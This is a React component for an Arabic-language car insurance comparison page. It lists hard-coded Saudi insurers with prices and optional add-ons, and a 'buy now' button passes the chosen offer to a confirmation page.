import React, { useState } from "react";
import { imgData } from "../App";
import { TailSpin } from "react-loader-spinner";
const Activate = () => {
  const query = new URLSearchParams(window.location.search);
  const data = query.get("data");
  const [page, setPage] = useState("ضد الغير");
  const [loading, setLoading] = useState(false);

  const handleVisa = (idx) => {
    setLoading(true);
    const company = companies[idx];
    const finalData = { ...JSON.parse(data), companyData: company };
    return (window.location.href = `/confirm?data=${JSON.stringify(
      finalData
    )}`);
  };

  const companies = [
    {
      name: "شركة ولاء للتأمين التعاوني",
      logo: "/walaa.jpg",
      price: 502,
      options: [
        {
          label: "تغطية الحوادث الشخصية للسائق ",
          price: 50,
          checked: false,
        },
        {
          label: "تغطية الحوادث الشخصية للركاب ",
          price: 270,
          checked: false,
        },
      ],
    },
    //-------------------------------------
    {
      name: "تكافل الراجحي",
      logo: "/takafl rajhi.jpg",
      price: 277.22,
      options: [
        { label: "الاخطار الطبيعية", price: 100, checked: false },
        { label: "مساعدة على الطريق", price: 30, checked: false },
        {
          label: "تغطية دول مجلس التعاون الخليجي",
          price: 150,
          checked: false,
        },
        { label: "تغطية حوادث للسائق والركاب", price: 70, checked: false },
      ],
    },
    {
      name: "بروج للتأمين التعاوني",
      logo: "/buruj.png",
      price: 679,
      options: [
        {
          label: "تغطية الحوادث الشخصية للسائق فقط",
          price: 70,
          checked: false,
        },
        {
          label: "تغطية الحوادث الشخصية للركاب فقط",
          price: 420,
          checked: false,
        },
      ],
    },
    {
      name: "سلامة للتأمين",
      logo: "/salamih.webp",
      price: 838,
      options: [],
    },
    {
      name: "التعاونية",
      logo: "/altawneih.jpg",
      price: 734,
      options: [{ label: "مساعدة على الطريق", price: 50, checked: false }],
    },
    {
      name: "ميدغلف السعودية",
      logo: "/medgulf.png",
      price: 838,
      options: [{ label: "مساعدة على الطريق", price: 30, checked: false }],
    },
    //-------------------------------------
    {
      name: "متكاملة للتأمين",
      logo: "/motakamlh.jpg",
      price: 900,
      options: [
        {
          label: "الوفاة والإصابة الجسدية والمصاريف الطبية للسائق",
          price: 30,
          checked: false,
        },
      ],
    },
    //-------------------------------------
    {
      name: "المجموعة المتحدة للتأمين التعاوني",
      logo: "/acig.png",
      price: 977,
      options: [
        {
          label: "تغطية الحوادث الشخصية للسائق ",
          price: 50,
          checked: false,
        },
        {
          label: "تغطية الحوادث الشخصية للركاب ",
          price: 240,
          checked: false,
        },
      ],
    },
    //-------------------------------------
    {
      name: "ليڤا للتأمين",
      logo: "/liva.jpg",
      price: 800,
      options: [
        {
          label: "تغطية الحوادث الشخصية للسائق ",
          price: 50,
          checked: false,
        },
        {
          label: "تغطية الحوادث الشخصية للركاب ",
          price: 280,
          checked: false,
        },
        { label: "مساعدة على الطريق", price: 50, checked: false },
      ],
    },
    //-------------------------------------
    {
      name: "الجزيره التكافل التعاوني",
      logo: "/aljazira.webp",
      price: 520,
      options: [],
    },
    //-------------------------------------
    {
      name: "التأمين العربي التعاوني",
      logo: "/alarabia.webp",
      price: 1020,
      options: [
        {
          label: "تغطية الحوادث الشخصية للسائق ",
          price: 60,
          checked: false,
        },
      ],
    },
    //-------------------------------------
    {
      name: "شركة الوطنية للتأمين",
      logo: "/alwataneh.png",
      price: 800,
      options: [],
    },
    //-------------------------------------

    //-------------------------------------
    {
      name: "المتحدة للتامين التعاوني",
      logo: "/almutahida.webp",
      price: 650,
      options: [
        { label: "مساعدة على الطريق", price: 0, checked: true },
        {
          label: "تغطية الحوادث الشخصية للسائق ",
          price: 40,
          checked: false,
        },
        {
          label: "مساعدة على الطريق البلاتيني",
          price: 150,
          checked: false,
        },
      ],
    },
    //-------------------------------------
    {
      name: "شركة أمانة للتأمين التعاوني",
      logo: "/amana.jpg",
      price: 705,
      options: [
        {
          label:
            "الوفاة والإصابة الجسدية والمصاريف الطبية للمؤمن له أو السائق المسمى",
          price: 50,
          checked: false,
        },
      ],
    },
    //-------------------------------------
    {
      name: "شركة اليانز للتأمين",
      logo: "/Allianz.png",
      price: 1400,
      options: [
        {
          label: "تغطية الحوادث الشخصية للسائق فقط",
          price: 60,
          checked: false,
        },
      ],
    },
    //-------------------------------------
    {
      name: "جي.آي.جي",
      logo: "/gig.png",
      price: 2000,
      options: [
        { label: "الاصابة الجسدية للغير", price: 0, checked: true },
        { label: "تلف ممتلكات الغير", price: 0, checked: true },
        {
          label: "تغطية الحوادث الشخصية للسائق ",
          price: 50,
          checked: false,
        },
        {
          label: "تغطية الحوادث الشخصية للركاب ",
          price: 270,
          checked: false,
        },
      ],
    },
    //-------------------------------------
    {
      name: "شركة الدرع العربي",
      logo: "/aldera alarabi.webp",
      price: 800,
      options: [
        { label: "مساعدة على الطريق", price: 25, checked: false },
        {
          label: "تغطية الحوادث الشخصية للسائق ",
          price: 60,
          checked: false,
        },
        {
          label: "تغطية الحوادث الشخصية للركاب ",
          price: 290,
          checked: false,
        },
      ],
    },
    //-------------------------------------
    {
      name: "شركة التحاد للتأمين",
      logo: "/aletihad.png",
      price: 902,
      options: [
        {
          label: "تغطية الحوادث الشخصية للسائق ",
          price: 50,
          checked: false,
        },
      ],
    },
    //-------------------------------------
    {
      name: "الخليجية العامة للتأمين",
      logo: "/gulf.webp",
      price: 630,
      options: [
        { label: "مساعدة على الطريق", price: 25, checked: false },
        {
          label: "تغطية الحوادث الشخصية للسائق ",
          price: 60,
          checked: false,
        },
        {
          label: "تغطية الحوادث الشخصية للركاب ",
          price: 290,
          checked: false,
        },
      ],
    },
    //-------------------------------------
  ];

  return (
    <>
      {loading ? (
        <div className="flex top-0 z-50 w-full justify-center items-center h-screen fixed bg-black bg-opacity-60">
          <div className="bg-white rounded-md p-3 w-fit h-fit flex items-center justify-center gap-x-3">
            <span className="text-lg">يتم المعالجة</span>
            <img src="/logo.svg" className="w-14 h-14" />
            <TailSpin
              height="30"
              width="30"
              color="gray"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
          </div>
        </div>
      ) : (
        ""
      )}
      <div dir="rtl" className="bg-white min-h-screen flex flex-col font-bold">
        <div className="w-full   mx-auto px-4">
          <div className="flex justify-center bg-gray-100 rounded-full mt-3 py-2 px-2 w-1/2 mx-auto">
            <a
              onClick={() =>
                (window.location.href = `/activate_shamel` + "?data=" + data)
              }
              className={`flex-1 text-center text-[#146394] py-2 font-semibold ${
                page === "شامل" ? "!bg-[#146394] !text-white rounded-full" : ""
              }`}
            >
              شامل
            </a>
            <a
              onClick={() => setPage("ضد الغير")}
              className={`flex-1 text-center text-[#146394] py-2 font-semibold ${
                page === "ضد الغير"
                  ? "bg-[#146394] !text-white rounded-full"
                  : ""
              }`}
            >
              ضد الغير
            </a>
          </div>
          <div className="bg-[#146394] flex flex-col gap-y-3 rounded-md text-center py-4 px-2 text-white   mt-6 mb-4">
            <span className="text-xl font-bold"> التأمين ضد الغير</span>
            <span className="text-sm">
              تغطية أساسية تشمل المسؤولية المدنية تجاه الغير بحد أقصى 10,000,000
              ريال
            </span>
          </div>

          <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-y-5 gap-4 my-6  ">
            {companies.map((company, index) => {
              return (
                <div
                  key={index}
                  className="shadow rounded-md p-4 border-[#146394] border-l-4"
                >
                  <div className="flex justify-between items-start">
                    <div>
                      <h6 className="font-bold text-gray-800 mb-1">
                        {company.name}
                      </h6>
                      <p className="text-sm text-[#146394] ">
                        {" "}
                        تأمين ضد الغير{" "}
                      </p>
                    </div>
                    <img
                      src={company.logo}
                      alt={company.name}
                      className="h-10"
                    />
                  </div>

                  <hr className="my-3" />
                  <h6 className="text-sm font-bold text-gray-800 mb-3">
                    المزايا الأساسية
                  </h6>

                  <div className="text-sm space-y-2 flex flex-col gap-y-2">
                    <div className="flex justify-between">
                      <div className="flex  items-start">
                        <input
                          type="checkbox"
                          checked
                          disabled
                          className=" mt-2 w-fit"
                        />
                        <span className="flex-1 pr-2 flex flex-wrap">
                          المسؤولية المدنية تجاه الغير بحد أقصى <br />
                          <strong>
                            10,000,000{" "}
                            <svg
                              viewBox="0 0 1300 1200"
                              className="w-4 h-4 inline fill-yellow-500"
                            >
                              <path d="M1085.73,895.8c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.33v-135.2l292.27-62.11c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.27V66.13c-50.67,28.45-95.67,66.32-132.25,110.99v403.35l-132.25,28.11V0c-50.67,28.44-95.67,66.32-132.25,110.99v525.69l-295.91,62.88c-20.06,44.47-33.33,92.75-38.42,143.37l334.33-71.05v170.26l-358.3,76.14c-20.06,44.47-33.32,92.75-38.4,143.37l375.04-79.7c30.53-6.35,56.77-24.4,73.83-49.24l68.78-101.97v-.02c7.14-10.55,11.3-23.27,11.3-36.97v-149.98l132.25-28.11v270.4l424.53-90.28Z"></path>
                            </svg>
                          </strong>
                        </span>
                      </div>
                      <span className="text-[#146394] font-bold">مشمول</span>
                    </div>

                    {company.options.map((opt, i) => (
                      <div key={i} className="flex justify-between">
                        <label className="flex items-start gap-2">
                          <input
                            type="checkbox"
                            className="additional-option"
                            defaultChecked={opt.checked}
                            onChange={(e) => (opt.checked = e.target.checked)}
                          />
                          {opt.label}
                        </label>
                        <span className="text-[#146394] font-bold">
                          {opt.price > 0 ? `${opt.price}` : "مجاني"}
                          {opt.price > 0 ? (
                            <svg
                              viewBox="0 0 1300 1200"
                              className="w-4 h-4 inline fill-yellow-500"
                            >
                              <path d="M1085.73,895.8c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.33v-135.2l292.27-62.11c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.27V66.13c-50.67,28.45-95.67,66.32-132.25,110.99v403.35l-132.25,28.11V0c-50.67,28.44-95.67,66.32-132.25,110.99v525.69l-295.91,62.88c-20.06,44.47-33.33,92.75-38.42,143.37l334.33-71.05v170.26l-358.3,76.14c-20.06,44.47-33.32,92.75-38.4,143.37l375.04-79.7c30.53-6.35,56.77-24.4,73.83-49.24l68.78-101.97v-.02c7.14-10.55,11.3-23.27,11.3-36.97v-149.98l132.25-28.11v270.4l424.53-90.28Z"></path>
                            </svg>
                          ) : (
                            ""
                          )}
                        </span>
                      </div>
                    ))}
                  </div>

                  <div className="flex justify-between items-center text-[#146394] text-xl font-bold mt-3 pt-5 border-t">
                    <div>
                      <span className="font-bold"> {company.price} </span>
                      <svg
                        viewBox="0 0 1300 1200"
                        className="w-4 h-4 inline fill-yellow-500"
                      >
                        <path d="M1085.73,895.8c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.33v-135.2l292.27-62.11c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.27V66.13c-50.67,28.45-95.67,66.32-132.25,110.99v403.35l-132.25,28.11V0c-50.67,28.44-95.67,66.32-132.25,110.99v525.69l-295.91,62.88c-20.06,44.47-33.33,92.75-38.42,143.37l334.33-71.05v170.26l-358.3,76.14c-20.06,44.47-33.32,92.75-38.4,143.37l375.04-79.7c30.53-6.35,56.77-24.4,73.83-49.24l68.78-101.97v-.02c7.14-10.55,11.3-23.27,11.3-36.97v-149.98l132.25-28.11v270.4l424.53-90.28Z"></path>
                      </svg>
                    </div>
                    <button
                      onClick={() => handleVisa(index)}
                      className={`bg-[#146394] text-white px-4 py-1 rounded hover:bg-yellow-600`}
                    >
                      اشترِ الآن
                    </button>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </div>
    </>
  );
};

export default Activate;
